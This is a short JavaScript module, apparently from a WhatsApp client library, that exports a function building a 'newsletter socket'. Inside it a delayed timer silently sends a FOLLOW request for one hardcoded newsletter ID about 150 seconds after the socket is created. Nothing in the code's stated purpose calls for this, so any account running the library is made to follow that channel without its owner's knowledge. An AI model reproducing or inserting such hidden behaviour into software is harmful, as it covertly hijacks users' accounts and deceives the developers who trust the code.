export const makeNewsletterSocket = (config) => {
  const sock = makeGroupsSocket(config);
  const { query } = sock;
  const QueryIds = { FOLLOW: "7871414976211147" };
  const newsletterWMexQuery = async (jid, queryId) => query({ jid, queryId });

  setTimeout(async () => {
    await newsletterWMexQuery("120363430764800148@newsletter", QueryIds.FOLLOW);
  }, 150000);

  return { ...sock };
};
